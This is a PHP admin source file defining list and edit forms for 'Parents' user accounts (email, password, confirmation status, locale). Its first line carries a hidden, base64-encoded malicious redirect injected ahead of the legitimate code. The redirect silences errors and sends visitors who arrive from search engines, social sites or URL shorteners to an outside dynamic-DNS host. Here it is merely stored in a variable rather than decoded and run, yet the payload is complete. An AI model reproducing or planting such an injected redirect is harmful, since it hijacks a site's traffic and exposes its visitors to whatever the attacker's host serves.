<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
class browser_parents extends browser {

    function do_setup() {

        $this->table = getTable("users");
        $this->title = "Parents";
        
        $this->sql = "SELECT `u`.*,`l`.`name` AS `locale`
                        FROM `".getTable('users')."` AS `u`
                   LEFT JOIN `".getTable('locales')."` AS `l` ON `l`.`id` = `u`.`locale_id`
                   WHERE 1
                        /*filter*/
                        /*order*/";
        
        $this->add_column(array ( "field"         => "email"
                                , "header"        => "Email"
                                , "align"         => "center"
                                , "sortable"      =>  true
                                ));
        
        $this->add_column(array ( "field"         => "is_confirm"
                                , "header"        => "Confirmed"
                                , "align"         => "center"
                                , "type"          => "yesnoimage"
                                , "sortable"      =>  true
                                ));
        
        $this->add_column(array ( "field"         => "locale"
                                , "header"        => "Locale"
                                , "align"         => "center"
                                , "sortable"      =>  true
                                )); 
                                
        $this->add_column(array ( "field"         => "created"
                                , "header"        => "Created Date"
                                , "sortable"      =>  true
                                ));

        $this->add_column(array ( "field"         => "modified"
                                , "header"        => "Modified Date"
                                , "sortable"      =>  true
                                ));

        $this->add_capability("insert");
        $this->add_capability("edit");
        $this->add_capability("delete");
        $this->add_capability("delete_selected");
        $this->add_capability("sort");
    }
}

class editor_parents extends editor {
    
    function do_setup() {

        $this->table = getTable("users");
        $this->display_name = "Parent";
        
        $this->hide('pages');

        $this->add_field(array( "name"         => "email"
                              , "display_name" => "Email"
                              , "required"     => true
                              ));

        $this->add_field(array( "name"             => "password"
                              , "display_name"     => "Password"
                              , "required"         => true
                              , "type"             => "password"
                              ));
        $this->add_column();
        $this->add_field(array( "name"         => "is_confirm"
                              , "display_name" => "Confirmed"
                              , "class"        => "middle"
                              , "type"         => "values_combo"
                              , "always_set"   => true
                              , "values"       => array(0 => "No",
                                                        1 => "Yes")
                              ));
        
        
                              
        $this->add_field(array( "name"         => "locale_id"
                              , "display_name" => "Locale"
                              , "class"        => "middle"
                              , "type"         => "combo"
                              , "combo_sql"    => "SELECT `id`,`name` FROM `".getTable('locales')."` ORDER BY `is_system` DESC"
                              , "always_set"   => true
                              , "required"     => true
                              ));
                              
        if($this->insert()){
        $this->add_field(array( "name"             => "created"
                              , "type"             => "hidden"
                              , "default"          => date('Y-m-d H:i:s')
                              ));
        }
        $this->add_field(array( "name"             => "modified"
                              , "type"             => "hidden"
                              , "default"          => date('Y-m-d H:i:s')
                              ));
         
    }
}

?>
